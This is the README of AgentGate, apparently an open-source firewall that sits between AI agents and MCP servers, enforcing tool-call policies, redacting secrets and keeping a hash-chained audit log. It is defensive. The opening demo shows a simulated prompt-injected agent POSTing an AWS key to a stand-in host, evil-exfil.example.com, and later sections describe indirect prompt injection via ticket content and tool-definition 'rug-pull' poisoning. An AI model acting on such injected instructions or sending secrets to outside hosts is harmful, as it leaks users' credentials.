# AgentGate

**The open-source firewall for AI agents.** AgentGate sits between an MCP client (like Claude Code) and the
downstream MCP servers it talks to, evaluates every tool call against a policy you control, and keeps a
tamper-evident audit trail of what happened.

![AgentGate Control Center — live timeline of allowed and denied tool calls](docs/assets/control-center-overview.png)

## A blocked attack, end to end

A prompt-injected agent tries to exfiltrate an AWS key over HTTP. AgentGate denies it, redacts the key before it
ever touches disk, and records a verifiable audit trail — all from real, checked-in policy and gateway code, not a
mockup:

```text
Simulated attack: prompt-injected agent attempts to
POST an AWS API key to an external server.

Tool called: network.request
Target URL:  https://evil-exfil.example.com/collect

Gateway Response: {
  content: [ { type: 'text', text: '[AgentGate] Denied by rule "block-secret-exfiltration": ...' } ],
  isError: true
}
Step 1 — Policy decision: ✅ DENIED

Verifying Audit Records in DB...
✅ PASS — 1 audit event found.
✅ PASS — Event status is DENIED.
✅ PASS — Event arguments are flagged as redacted.
✅ PASS — The raw AWS key is ABSENT from the persisted data.

Verifying Tamper-Evident Hash Chain...
✅ PASS — Audit chain verified (2 records).
```

Run it yourself: `node examples/secret-exfiltration/demo.mjs` (see [Demo and verification](#demo-and-verification)).

## Project status

**Public beta.** AgentGate implements a real policy engine, a real MCP stdio proxy, a
real tamper-evident audit store, a real Control Center UI, a real Safe Replay policy-drift analyzer, a real Tool
Integrity Registry, a real Context Guard cross-tool escalation defense, and a real onboarding CLI (`init`/
`config validate`/`doctor`/`integrate`/`smoke-test`) — all covered by executable tests (632 workspace tests + 15
dedicated release-tooling tests as of this milestone, 2 intentionally platform-skipped) and end-to-end demos/scripts
(see [`docs/VERIFICATION.md`](docs/VERIFICATION.md)). "Beta" here means the security properties below are real,
tested, and adversarially demoed, but the project has not yet had independent external security review, the
API/CLI/config surface may still change before a stable `1.0`, and — as of this milestone — **no package has been
published to any registry** (see [Installation](#installation)).
It is **not** production-hardened: there is no authentication beyond a per-launch local token, no multi-user
support, and MCP protocol support is currently **legacy 2025-era stdio only** (see
[Supported integrations](#supported-integrations)). Read [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) before
relying on it for anything sensitive.

**Platform/runtime support matrix** — backed by CI, not just claimed:

| Platform | Node | Coverage |
|---|---|---|
| Ubuntu (Linux) | 20, 22 | Full CI: build, lint, full test suite, all demos, packed-install verification, release-consistency check |
| Windows | 22 | Full CI, same steps — native `better-sqlite3` smoke test; 2 POSIX-only lifecycle tests skip here (see [`docs/DEVELOPMENT.md`](docs/DEVELOPMENT.md)) |
| macOS | 22 | A high-value CI subset: build, lint, full test suite (exercises the `better-sqlite3` native module), packed-install verification, release-consistency check. The five attack/defense demos are not separately re-run here — no macOS-specific code path exists, and they already run to completion on Ubuntu and Windows above |

## Five-minute quickstart

Requires Node.js 20+ and [pnpm](https://pnpm.io) (see `.nvmrc` / `packageManager` in `package.json`). Every
command below was actually run in a clean environment as part of verifying this milestone — see
[`docs/VERIFICATION.md`](docs/VERIFICATION.md) for the exact evidence.

```sh
git clone https://github.com/chidhvilasa/agentgate.git
cd agentgate
pnpm install --frozen-lockfile
pnpm run build

# Prove AgentGate itself works, right now, with no setup — fully local and offline
node packages/gateway/dist/cli.js smoke-test

# Generate a safe, deny-by-default starter project (never overwrites without --force)
node packages/gateway/dist/cli.js init my-agentgate-project

# Check the generated config before starting anything
node packages/gateway/dist/cli.js config validate my-agentgate-project/agentgate.yml
node packages/gateway/dist/cli.js doctor my-agentgate-project/agentgate.yml

# Edit my-agentgate-project/agentgate.yml's downstream server entry, then:
node packages/gateway/dist/cli.js start my-agentgate-project/agentgate.yml
```

![agentgate init generating a deny-by-default project](docs/assets/cli-init.png)
![agentgate doctor reporting a clean, ready-to-start project](docs/assets/cli-doctor.png)
![agentgate smoke-test proving allow, deny, and secret redaction all work, fully offline](docs/assets/cli-smoke-test.png)

The gateway prints a local Control Center URL and a one-time auth token to stderr on startup. Open the URL, paste
the token in when prompted. To connect a supported MCP client instead of using the Control Center alone, generate a
config snippet: `node packages/gateway/dist/cli.js integrate claude-code my-agentgate-project/agentgate.yml` (see
[Client integrations](#client-integrations) below). See [`docs/QUICKSTART.md`](docs/QUICKSTART.md) for the full
walkthrough, including running the Control Center in dev mode and installing from packed tarballs instead of
building from source.

**Uninstalling / removing generated files:** `my-agentgate-project/` (or wherever you ran `init`) contains only
`agentgate.yml`, `agentgate.policy.yml`, and — once you've started the gateway at least once —
`agentgate.sqlite`/`agentgate.sqlite-wal`/`agentgate.sqlite-shm`; delete the directory to remove everything. If you
generated a client integration snippet with `--apply`, remove the `"agentgate"` entry it added to your client's MCP
config (each `integrate` run prints the exact removal instructions for that client), and delete any
`.backup-<timestamp>` file it created if you no longer want it. Nothing AgentGate installs lives outside the
directory you pointed it at.

## How AgentGate fits

```text
 MCP client              AgentGate gateway                 Downstream MCP server
(Claude Code, …)  ─────▶  stdio proxy → policy engine  ─────▶  (filesystem, network, …)
                              │                 │
                              ▼                 ▼
                         audit storage     Control Center
                          (SQLite,          (local web UI,
                        hash-chained)      loopback only)
```

AgentGate speaks MCP on both sides: it is a server to your MCP client and a client to the real downstream MCP
server. Every tool call it forwards has already been evaluated, and every decision — allow, deny, redact, or hold
for human approval — is recorded before the call reaches (or is kept from reaching) the real server. See
[`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) for the full sequence diagram.

## Core features

- **Policy engine** — declarative YAML rules matched by agent, tool, path, command, host, and secret content; first
  match wins; secure default-deny.
- **Four decision types** — `allow`, `deny`, `require_approval` (human-in-the-loop, TTL-bound, single-use), and
  `allow_with_transform` (redact specific fields, then forward).
- **Deep secret redaction — bidirectional** — AWS/GitHub/OpenAI/Anthropic key patterns, bearer tokens,
  private-key headers, and DB connection strings are detected and redacted from every persisted audit record
  (inbound arguments), from downstream results before they reach the agent, and from every downstream/internal
  error message before it is persisted or logged (see [Output security](#output-security) below).
- **Tamper-evident audit trail** — every event is a SHA-256 hash-chained, append-only record in SQLite;
  `agentgate audit verify` independently re-walks and verifies the chain.
- **Control Center** — a local, loopback-only web UI: live SSE timeline, approval queue, per-event detail with
  redaction and hash-chain display, and the currently loaded policy.
- **Path-traversal defenses** — path arguments are normalized (`..`/`.` resolved, separators unified) before
  matching or persistence.
- **Safe Replay — policy re-evaluation, never re-execution** — re-evaluate a historical, redacted event against
  the *current* policy to see whether the decision would change, with `executed` a fixed literal `false`; never
  contacts a downstream server, never creates an approval (see [Safe Replay](#safe-replay) below).
- **Tool Integrity Registry — rug-pull / tool-definition-poisoning defense** — fingerprints every downstream tool
  definition and quarantines a new or changed one until a human explicitly accepts its exact fingerprint;
  enforced in the gateway request path itself, both for what is exposed via discovery and for a direct call by a
  cached tool name (see [Tool Integrity](#tool-integrity) below).
- **Context Guard — cross-tool session-risk escalation defense** — attaches conservative, operator-owned risk
  labels to the current execution context based on which tools were called and what their results were
  classified as, then checks a later call's own declared effects against those accumulated labels before
  allowing it — closing the "read untrusted content, then quietly exfiltrate it with a different, individually-
  legal-looking call" gap left open by evaluating each call in isolation (see [Context Guard](#context-guard)
  below).

## Example policy

```yaml
version: 1

defaults:
  decision: deny

rules:
  - id: allow-project-reads
    description: Allow reading files inside the project root.
    agents: ["claude-code"]
    tools: ["read_file", "list_directory"]
    paths: ["${PROJECT_ROOT}/**"]
    decision: allow

  - id: approve-file-writes
    description: Require approval before writing any file.
    tools: ["write_file", "create_directory"]
    decision: require_approval
    approval_ttl_seconds: 120

  - id: block-secret-exfiltration
    description: Block network requests that appear to carry secrets or API keys.
    tools: ["network.*", "fetch", "http_request"]
    contains_secrets: true
    decision: deny
```

Full field reference, matching semantics, and worked examples: [`docs/POLICY_REFERENCE.md`](docs/POLICY_REFERENCE.md).

## CLI

```sh
# Getting started
agentgate init [directory] [--force]        # Generate a deny-by-default config + policy
agentgate config validate [config.yml]      # Validate a config and its policy before starting
agentgate doctor [config.yml]               # Read-only diagnostics — never executes, never mutates
agentgate integrate <client> [config.yml]   # Generate an MCP client integration snippet
agentgate smoke-test                        # Harmless, offline, built-in proof AgentGate works

# Running
agentgate start [config.yml]          # Start the gateway (default: ./agentgate.yml)
agentgate validate [policy.yml]       # Validate a policy file only (see also: config validate)
agentgate audit verify [config]       # Independently re-verify the tamper-evident audit chain and replay lineage
agentgate replay <event-id> [config]  # Safe Replay: re-evaluate a historical event against the current policy.
                                       # Policy re-evaluation only — never executes the tool. Add --json for
                                       # machine-readable output.

agentgate tools scan|status|diff|trust|reject|history [--config <path>]
                                       # Tool Integrity Registry: rescan the downstream server, list trust status,
                                       # show a safe field-level diff, and accept/reject an EXACT candidate
                                       # fingerprint. See "Tool Integrity" below.

agentgate context status|history|explain|reset|verify [--config <path>]
                                       # Context Guard: bounded context list/history, a stored-evidence
                                       # explanation of accumulated labels, the only mutating command (exact
                                       # revision + reason), and chain verification. See "Context Guard" below.

agentgate --version                   # Print the installed version
agentgate <command> --help            # Print detailed usage for any command
```

`agentgate` is `packages/gateway/dist/cli.js` after `pnpm run build` (not yet published to npm — see
[Project status](#project-status) and [Installation](#installation) below). Run it as
`node packages/gateway/dist/cli.js <command>` from the repo root, via the workspace bin from inside
`packages/gateway`, or as `agentgate` directly once installed from packed tarballs (see below).

## Installation

**No AgentGate package has been published to the npm registry yet** — this beta ships as source and as packed
tarballs only. `npm install @agentgate/gateway` will work **once published** (see
[Release channels and future registry install](#release-channels-and-future-registry-install) below); until then,
use one of the two methods below, both proven with a real, automated, CI-enforced check
(`scripts/verify-packed-install.mjs`), not assumed:

1. **From source** (recommended; always works): `git clone` + `pnpm install --frozen-lockfile` +
   `pnpm run build`, as in the quickstart above. `agentgate` is then `packages/gateway/dist/cli.js`.
2. **From packed tarballs**, without cloning the whole repo into your project:
   ```sh
   git clone https://github.com/chidhvilasa/agentgate.git && cd agentgate
   pnpm install --frozen-lockfile && pnpm run build
   for pkg in protocol policy gateway; do (cd packages/$pkg && pnpm pack --pack-destination /tmp/agentgate-pkgs); done
   mkdir my-consumer && cd my-consumer && npm init -y
   npm install /tmp/agentgate-pkgs/agentgate-protocol-*.tgz /tmp/agentgate-pkgs/agentgate-policy-*.tgz /tmp/agentgate-pkgs/agentgate-gateway-*.tgz
   ./node_modules/.bin/agentgate smoke-test
   ```
   **All three tarballs must be installed together in one `npm install` command.** Installing the gateway
   tarball alone fails with a real `404` — `pnpm pack` rewrites its `workspace:*` dependencies on
   `@agentgate/policy`/`@agentgate/protocol` to a bare version number that has never been published to any
   registry; installing all three together lets npm resolve the sibling packages from the other tarballs given
   in the same command. This is **not** the same as `npm install agentgate` from the public npm registry, which
   this project does not publish to or claim — and note the unscoped `agentgate` name on npm already belongs to
   an unrelated third-party project; AgentGate only ever uses the `@agentgate/*` scope.

Not yet supported: a published npm package (see above), a Homebrew/system package, or a standalone binary. See
[`docs/DEVELOPMENT.md`](docs/DEVELOPMENT.md#installability) for the full audit.

### Prerequisites

| Requirement | Version | Why |
|---|---|---|
| Node.js | >=20 (20 or 22 actively tested; see the platform matrix above) | `engines.node` in every package; `better-sqlite3` needs a matching prebuilt/compilable native binary |
| [pnpm](https://pnpm.io) | pinned via `packageManager` in `package.json` (source install only) | workspace install/build; not needed for the tarball-install method above |
| git | any recent version | cloning the source |

### Release channels and future registry install

This beta publishes prerelease versions under a `beta` tag pattern (`0.1.0-beta.1`, `0.1.0-beta.2`, …) — see
[ADR-0014](docs/AI_DECISIONS.md) for the full versioning policy. **Once published** (a distinct, later, explicitly
owner-approved step — see the Milestone 8 section of [`docs/VERIFICATION.md`](docs/VERIFICATION.md) for exactly
what that step involves and has and has not happened so far), installation will be:

```sh
npm install -g @agentgate/gateway   # not yet published — this command does not work today
```

`@agentgate/protocol` and `@agentgate/policy` are also independently installable (for building your own tooling
against AgentGate's types/policy engine); most users only need `@agentgate/gateway`, which depends on the other two.

### Verifying a downloaded release (checksums, SBOM, attestation)

Once packages/tarballs are actually published, each release is accompanied by (generated locally today via
`node scripts/generate-release-manifest.mjs`, see [`docs/VERIFICATION.md`](docs/VERIFICATION.md) for the exact
generated-evidence from this milestone):

- **`checksums.sha256`** — verify a downloaded tarball with `sha256sum -c checksums.sha256` (or
  `certutil -hashfile <file> SHA256` on Windows and compare by hand).
- **`sbom.cyclonedx.json`** — a CycloneDX 1.5 Software Bill of Materials built from the real resolved production
  dependency graph (`pnpm licenses list --prod`), not a template.
- **`release-manifest.json`** — commit, package versions, tarball filenames/hashes/sizes, and the Node/npm/pnpm
  versions used to build.
- **GitHub artifact attestations** (once the release workflow has actually run and published — see
  [ADR-0014](docs/AI_DECISIONS.md) and [`docs/VERIFICATION.md`](docs/VERIFICATION.md)): verify with
  `gh attestation verify <file> -R chidhvilasa/agentgate`. This proves the artifact was built by this specific
  GitHub Actions workflow run at this specific commit — **build/origin linkage, not a guarantee the code is free of
  vulnerabilities or malicious behavior**, and a genuinely different trust path from npm's own trusted-publishing
  provenance (which attests the *published package*, not these locally-generated files) — both are worth checking
  independently, neither substitutes for the other.

### Upgrading, downgrading, and uninstalling

- **Upgrade**: re-run the install method above with a newer tarball/version. `agentgate.yml`/`agentgate.policy.yml`
  are plain files you own — nothing is migrated automatically, and no config format has broken compatibility yet
  (see the [Changelog](CHANGELOG.md) for any future breaking change, which will always be called out explicitly
  with a migration note, per [ADR-0014](docs/AI_DECISIONS.md)).
- **Downgrade**: install an older tarball/version the same way; the SQLite audit database's schema has been
  additive-only so far (no destructive migrations exist in this codebase yet) but downgrading is not routinely
  tested — back up `agentgate.sqlite*` first if it matters to you.
- **Uninstall**: see "Uninstalling / removing generated files" in the quickstart above — everything AgentGate
  writes lives inside the directory you pointed `init`/`start` at; there is no system-wide install, service, or
  registry entry to remove.

## Client integrations

| Client | Config format verified against | Status |
|---|---|---|
| [Claude Code](https://code.claude.com/docs/en/mcp) | `.mcp.json` project file / `claude mcp add-json`, `mcpServers.<name> = {command, args, env}` | **Supported** — `agentgate integrate claude-code` |
| [Google Antigravity](https://antigravity.google/docs/ide/mcp/) | `.agents/mcp_config.json` (workspace) or `~/.gemini/config/mcp_config.json` (global), `mcpServers.<name> = {command, args, env, cwd, disabled}` | **Supported** — `agentgate integrate antigravity` |
| Any other MCP client with local stdio server support | Not verified against a specific product | **Generic recipe only** — `agentgate integrate generic`, explicitly labeled unverified in its own output |

```sh
agentgate integrate claude-code my-agentgate-project/agentgate.yml
```

![agentgate integrate printing a Claude Code MCP config snippet with source citation](docs/assets/cli-integrate.png)

prints a ready-to-use JSON snippet, where to put it, and how to remove it — see the [Getting Started](#five-minute-quickstart)
walkthrough above for a screenshot. By default `integrate` only ever **prints** the snippet or writes it to a
**new**, explicitly-named file (`--out`); it never touches a real client config file unless you pass the explicit
`--apply <path>` opt-in, which always creates a timestamped backup first, writes atomically, and preserves every
unrelated entry already in that file (`--dry-run` previews the result with zero writes). No integration ever
embeds an auth token — the Control API token is generated fresh per launch and only ever printed to the gateway's
own stderr.

## Control Center

A local-only React UI, served by Vite in development and reachable at the `control_port` configured in your
gateway YAML:

- **Overview** — live risk indicator, allow/deny/pending counts, recent high-risk events.
- **Timeline** — every intercepted tool call in real time over Server-Sent Events.
- **Approvals** — pending `require_approval` requests, with a countdown to TTL expiry; deny is the visually
  primary action.
- **Event Detail** — full decision trace, redacted arguments, the event's position in the hash chain, and a
  Safe Replay card to re-evaluate the event against the current policy (see [Safe Replay](#safe-replay) below).
- **Tool Integrity** — trust status per downstream tool, a safe field-level diff for a quarantined candidate, and
  exact-fingerprint accept/reject (see [Tool Integrity](#tool-integrity) below).
- **Context Guard** — active/closed/expired/reset context counts, a bounded/filterable context list, and a
  detail view with accumulated labels, the transition timeline, escalation reason, and the reset control (see
  [Context Guard](#context-guard) below).
- **Policies** — the currently loaded policy file and a decision-type reference (read-only in this milestone).

It authenticates with a random per-launch token (printed to the gateway's stderr on startup) sent as the
`x-agentgate-token` header, or as a `token` query parameter for the SSE stream. See
[Security model](#security-model-and-limitations) for what this does and does not protect against.

## Supported integrations

| Integration | Transport | Protocol era | Status | Evidence |
|---|---|---|---|---|
| Claude Code (and any MCP client using the legacy stdio transport) | stdio | **legacy 2025-era only** | Supported | `packages/gateway/src/transport/stdio.ts`; exercised end-to-end by `examples/secret-exfiltration/demo.mjs` |
| Any downstream MCP server over stdio | stdio | legacy 2025-era | Supported | `packages/gateway/src/pipeline.ts` (`executeDownstream`), `packages/gateway/src/config/registry.ts` |
| Modern stateless MCP (`2026-07-28`) | HTTP/stateless | modern | **Not implemented** | Deferred by [ADR-0005](docs/AI_DECISIONS.md); `McpEra` type exists in `packages/protocol` for forward-compat but only `'legacy-2025'` is ever emitted today |
| Downstream MCP servers over streamable HTTP | HTTP | — | **Not implemented** | `packages/gateway/src/config/registry.ts` accepts an `HttpServerSchema` in config but `pipeline.ts` only executes `stdio` servers |

If you need modern-era or HTTP-transport support today, AgentGate is not yet the right fit — track
[ADR-0005](docs/AI_DECISIONS.md) for status.

## Output security

Inbound tool-call **arguments** are secret-scanned and redacted before audit persistence (Milestone 1). As of
ADR-0009 (Milestone 3), downstream **results** are also sanitized — after a policy-allowed tool call executes,
`sanitizeToolResult()` inspects the result before it is ever returned to the upstream agent, and
`sanitizeErrorMessage()` sanitizes any downstream/internal error before it is persisted, hash-chained, or logged.
Raw downstream results are never persisted, in either direction, before or after this change — only safe metadata
(`result_redacted`/`result_blocked`/`result_finding_count`/`error_redacted`) is recorded on the audit event, shown
in the Control Center's Event Detail view:

![AgentGate Control Center — Event Detail showing a downstream result redacted by output security, with no secret rendered](docs/assets/control-center-result-security.png)

```yaml
output_security:
  mode: redact              # "redact" (default) — recognized secrets replaced with [REDACTED], result still returned
                             # "block"  — the whole result is replaced with a safe error if a secret is detected
                             #            or a depth/size limit prevented full inspection
  max_depth: 8               # structured-content nesting actually inspected
  max_text_bytes: 1000000    # per-string scan limit
```

- **Inspected**: MCP text content, structured content (string leaves only), and embedded-resource text.
- **Never inspected, in either mode**: `image`/`audio` content and resource `blob` data (base64 binary — never
  regex-scanned, to avoid corrupting the payload), unrecognized content-block types, and `_meta` fields. These
  pass through byte-identical.
- **Limitations**: this reuses the same conservative, pattern-based secret detector as inbound redaction — it is
  not a general DLP or PII-detection system, will miss unrecognized credential formats, and can occasionally
  redact benign text that matches a pattern. See [`docs/POLICY_REFERENCE.md`](docs/POLICY_REFERENCE.md#output-security-gateway-level)
  for the full field reference and [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md#malicious-downstream-mcp-server)
  for what this does and does not protect against.
- Try it: `node examples/downstream-secret-result/demo.mjs` — a real gateway and a real fixture downstream server
  that leaks a synthetic credential in both a result and an error message, both sanitized end-to-end.

## Safe Replay

**What it is:** Safe Replay re-evaluates a historical, already-redacted tool-call event against the policy
loaded *right now* and reports whether the decision would change — useful for validating a policy edit against
real history, or reviewing an incident after tightening a rule. **What it is not:** it never re-executes the
original tool call, never connects to, discovers, or contacts any downstream MCP server, never creates or
resolves an approval, and never mutates the source event. `executed` in every response is the fixed literal
`false` — there is no `dry_run` toggle, `execute` flag, or any other input that changes this; the API and CLI
both reject an execution-like field outright rather than silently ignoring it. See
[ADR-0010](docs/AI_DECISIONS.md) for the full design rationale and
[`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md#safe-replay-adr-0010) for what this does and does not protect
against.

![AgentGate Control Center — Safe Replay card showing a historical ALLOW decision compared against a changed current policy that now denies it, with a prominent no-execution indicator](docs/assets/control-center-safe-replay.png)

```sh
agentgate replay evt_abc123 examples/agentgate.yml --json
```

```json
{
  "replay_id": "rpl_...",
  "source_event_id": "evt_abc123",
  "mode": "policy_only",
  "executed": false,
  "source_arguments_redacted": false,
  "original": { "decision_type": "ALLOW", "matched_rule_id": "echo-rule", "reason_code": "POLICY_ALLOW" },
  "current":  { "decision_type": "DENY",  "matched_rule_id": "echo-rule", "reason_code": "POLICY_DENY", "explanation": "..." },
  "decision_changed": true,
  "matched_rule_changed": false,
  "comparison": "Policy decision changed from ALLOW to DENY.",
  "limitations": ["Safe Replay never executes the tool — this is a policy comparison only.", "..."]
}
```

- **Redacted-argument limitation**: AgentGate never stores raw arguments, so a replay of an event whose
  arguments were redacted at ingest evaluates the stored `[REDACTED]` placeholder, not the original secret
  value — a `contains_secrets`-style rule that matched the original value may no longer match on replay. This
  is always surfaced as an explicit limitation in the response, never silently.
- **Current policy, not a historical snapshot**: replay always compares against the policy loaded from disk at
  the moment of replay. It answers "what would this decision be today," not "what was policy at the time." The
  response's `policy_digest` records which policy version was actually used.
- **Its own tamper-evident lineage**: every replay evaluation is persisted in a separate, append-only,
  hash-chained table (`replay_evaluations`), verified alongside the audit chain by `agentgate audit verify`.
- Try it: `node examples/policy-drift-replay/demo.mjs` — a real gateway and a real fixture downstream server; one
  real audited tool call under policy A, then a policy change to policy B, replayed through both the Control
  API and the CLI, with the downstream server's call counter asserted unchanged throughout.

## Tool Integrity

**What it is:** a local registry that fingerprints every downstream tool definition (name, description, input/
output schema, annotations — the entire object, not a hand-picked subset) and tracks it against a stable local
server identity. A tool AgentGate has never seen, or one whose fingerprint has changed since it was last trusted,
is quarantined: not exposed via `tools/list`, and not callable directly by name either, even if the calling
client cached an older tool list. A human reviews the exact, field-level change and either accepts it (trusting
that EXACT fingerprint only) or rejects it. This defends against **tool-definition poisoning ("rug-pull")** — a
downstream MCP server that starts out benign, gets trusted, then silently changes its tool's description/schema
to something riskier later. See [ADR-0012](docs/AI_DECISIONS.md) for the full design and
[`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md#tool-definition-poisoning-rug-pull-adr-0012) for what this does and
does not protect against.

![AgentGate Control Center — Tool Integrity page showing a drifted, quarantined tool after a rug-pull, with counts by status](docs/assets/control-center-tool-integrity-overview.png)

![AgentGate Control Center — Tool Integrity review panel showing the safe, bounded, field-level diff for a quarantined candidate, with an untrusted-content warning](docs/assets/control-center-tool-integrity-diff.png)

```yaml
tool_integrity:
  mode: explicit   # explicit (recommended) | tofu | monitor (default when omitted) | disabled
```

- `explicit` — every new/changed definition is quarantined until a human accepts its exact fingerprint.
  `agentgate init` generates new projects with this mode.
- `tofu` — a tool's first-ever observation is trusted automatically; any LATER change is still quarantined.
- `monitor` — drift is detected and recorded, but never blocks discovery or calls. **Reporting only, never
  protection.** This is the default when `tool_integrity` is omitted, so upgrading an existing config never
  silently breaks it — see [`docs/POLICY_REFERENCE.md`](docs/POLICY_REFERENCE.md#tool-integrity) for the
  honest tradeoff and the one-line migration to `explicit`.
- `disabled` — the registry is not consulted at all; identical to every AgentGate version before this feature.

```sh
agentgate tools scan --config agentgate.yml      # rescan now — never calls a tool
agentgate tools status --config agentgate.yml    # every known tool and its trust status
agentgate tools diff <candidate-id> --config agentgate.yml   # safe, bounded, field-level drift
agentgate tools trust  <candidate-id> --fingerprint <hash> --config agentgate.yml   # accept — exact match required
agentgate tools reject <candidate-id> --fingerprint <hash> --config agentgate.yml   # reject — exact match required
```

There is no `--trust-all` and no way to trust by tool name alone — every accept/reject requires the exact
candidate id AND fingerprint currently on record, so a stale review can never silently approve a definition that
has since changed again. The same review flow (rescan, safe diff, exact-fingerprint accept/reject, history) is
also available in the Control Center's **Tool Integrity** page.

- Try it: `node examples/tool-rug-pull/demo.mjs` — a real gateway (`explicit` mode) and a real, dynamic fixture
  MCP server: trust a benign `read_file` tool, make one real call, watch the same running server start
  advertising a materially riskier definition for the same tool name, rescan, see it quarantined and no longer
  callable by its cached name — with the fixture's own call counter proving the downstream server was never
  contacted for the blocked call — reject it, and separately trust a later, genuinely distinct benign update.

## Context Guard

**What it is:** cross-tool session-risk escalation defense (ADR-0013) for the MCP "confused deputy" pattern: an
agent reads untrusted content from one tool (a ticket, a web page, a file) that contains an indirect
prompt-injection instruction telling it to read sensitive data with a second tool and exfiltrate it with a third
— where each individual call can look policy-legal in isolation, and only the *sequence* is the actual attack.
Context Guard closes this by attaching operator-declared risk labels to the current local execution context
based on which tools were called and what their results were classified as, then checking a later call's own
declared *effects* against those accumulated labels before allowing it. The observable sequence AgentGate
actually acts on:

1. **untrusted content observed** — a tool's successful, non-blocked result is classified by operator config as
   exposing the agent to `untrusted_content` (or another declared source label);
2. **sensitive data accessed** — a later tool's result adds `sensitive_data_accessed`;
3. **external transmission attempted** — a later call declares the `external_communication` effect;
4. **a stricter policy action applies before downstream contact** — a contextual rule matching the accumulated
   labels denies the call, or requires an exact, revision-bound human approval, before the downstream server is
   ever reached — including for a call by a cached/guessed tool name the client never re-listed.

**What this is explicitly not:** AgentGate never reads, inspects, or reasons about the upstream model's prompts,
completions, or memory — it only observes the MCP `tools/call` requests and results that actually cross the
gateway. A label is a policy assertion triggered by an observed gateway event, never a claim that an injection
actually happened, that the model "read" or "acted on" anything, or that one call *caused* a later one. Two calls
sharing one context is correlation by connection, not proof of causation — see
[Security model and limitations](#security-model-and-limitations) below and
[`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md#context-guard-cross-tool-escalation-defense-adr-0013) for the full,
explicit list of what this does and does not prove.

![AgentGate Control Center — Context Guard page showing an active execution context with accumulated risk labels, chain integrity status, and a lifecycle-filterable context list](docs/assets/control-center-context-guard.png)

![AgentGate Control Center — Context Guard detail view showing a denied contextual escalation: attempted tool, matched rule, reason, and the full transition timeline from context creation through the deny](docs/assets/control-center-context-guard-escalation.png)

```yaml
context_guard:
  mode: enforce            # "enforce" (recommended; agentgate init generates new projects with this mode) | "monitor" (default when omitted) | "disabled"
  tools:
    fetch_ticket:
      adds_on_result: [untrusted_content]      # labels added on a SUCCESSFUL, non-blocked result
    read_secret:
      effects: [sensitive_read]                # what this tool's CALL itself does
      adds_on_result: [sensitive_data_accessed]
    send_webhook:
      effects: [external_communication]
  rules:
    - id: deny-external-after-risk
      when:
        context_has_any: [untrusted_content, sensitive_data_accessed]
        target_has_any: [external_communication]
      action: deny                              # "deny" | "require_approval" — contextual rules only escalate
      reason: "External communication blocked: untrusted or sensitive content was accessed earlier in this session."
```

```sh
agentgate context status  --config agentgate.yml --json   # bounded list of contexts, most recently updated first
agentgate context history <context-id> --config agentgate.yml   # append-only transition history, chain-verified
agentgate context explain <context-id> --config agentgate.yml   # stored evidence only — never a fabricated decision
agentgate context reset   <context-id> --revision <n> --reason <text> --config agentgate.yml   # the only mutating command
agentgate context verify  --config agentgate.yml   # independently re-verify the context hash chain
```

There is no `reset-all`, no way to remove a single label, no "mark safe," and no way to force-approve — `reset`
requires the exact current revision and a non-empty reason, clears the active label set going forward without
deleting history, and invalidates every pending contextual approval bound to that context. It cannot erase
anything the upstream model or MCP client itself remembers from before the reset. The same status/history/detail/
reset flow is also available in the Control Center's **Context Guard** page, including the field- and label-level
context that produced a given decision.

- Try it: `node examples/context-poisoning/demo.mjs` — a real gateway, a real MCP SDK client, and a real
  downstream fixture server: `fetch_ticket` returns a realistic synthetic indirect-prompt-injection ticket body,
  `read_secret_fixture` returns a synthetic credential, and two attempts to `send_webhook` (one fresh, one by the
  same cached tool name) are both **denied** — the fixture's own call counter for `send_webhook` stays **exactly
  0** throughout. A second, independent context/connection then demonstrates the `require_approval` path: a
  pending approval bound to one context revision fails once the context has since advanced (counter stays 0), a
  fresh approval bound to the current revision executes (counter becomes exactly 1), and a third attempt requires
  its own fresh approval. No LLM is called anywhere in the script — it manually issues the exact tool sequence a
  compromised agent would issue, and Context Guard blocks/gates it from observed gateway history alone.

## Security model and limitations

AgentGate treats agent identity as **untrusted**: `declared_name`/`declared_version` are self-reported and used for
display only, never for authorization (`verified_identity` is always `false`). Policy decisions are made purely
from tool name, normalized path, command, host, and detected secret content.

**What the audit chain does and does not prove:** each audit record's SHA-256 hash covers the previous record's
hash, so silently editing or deleting a past record breaks the chain and `agentgate audit verify` will detect it.
This is **tamper-evident, not tamper-proof, and provides no non-repudiation guarantee** — a local administrator with
filesystem access to the SQLite database can replace the entire file and regenerate a self-consistent chain from
scratch. There is no external anchoring. See [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md) for the full model,
including indirect prompt injection, malicious downstream servers, approval replay, and denial-of-service risks
this milestone does **not** yet mitigate.

**What Tool Integrity does and does not prove:** a fingerprint is a local SHA-256 hash of a canonicalized
definition — it proves byte-for-byte equality to a previously observed definition, nothing about who authored it.
A stable, unchanged, trusted fingerprint does **not** prove the server's runtime behavior matches what it
advertises — a compromised server can still return a poisoned tool *result* through an entirely unchanged tool
*definition*; [Output security](#output-security) above remains the relevant defense for that. Local server
identity is a local launch-configuration identity, not remote attestation. Annotations
(`readOnlyHint`/`destructiveHint`/etc.) are untrusted, server-supplied hints and are never used to reduce
enforced risk. The registry's hash chain is local tamper *evidence*, exactly like the audit chain above — not
tamper-proof against a privileged local administrator. A definition can still change in the narrow window between
one scan and the next call; this is not fully eliminated (see ADR-0012). This is not remote attestation, signed
tools, sandboxing, runtime-behavior verification, or a claim of zero false positives.

**What Context Guard does and does not prove:** AgentGate tracks conservative, locally-observed gateway context —
which tools were called on the current stdio connection and what operator policy classifies their results as —
never the upstream model's actual reasoning, intent, or memory, and never proof that one call caused a later one.
One stdio connection/process is the current context boundary; it may not correspond to exactly one upstream model
conversation. Labels only ever accumulate (a contextual rule can escalate a decision, never downgrade a
base-policy one); a `reset` clears local AgentGate state only and cannot erase anything the model or MCP client
itself remembers. Context does not persist across a gateway restart or reconnect under a new process — a real
attack sequence spanning a restart is not detected. MCP tool annotations remain untrusted and are never consulted
to lower risk, exactly as for Tool Integrity above. TTL-based expiry exists in the schema but is not yet actively
scheduled. Context Guard's own hash chain is local tamper *evidence*, not tamper-proof, identical in kind to the
limitations above. This is not information-flow/taint tracking, not sandboxing, not a prompt-injection detector
(it never inspects text for injection patterns — only observed tool identity and classified result outcomes), and
not a claim that every covert or indirect exfiltration channel is closed. See
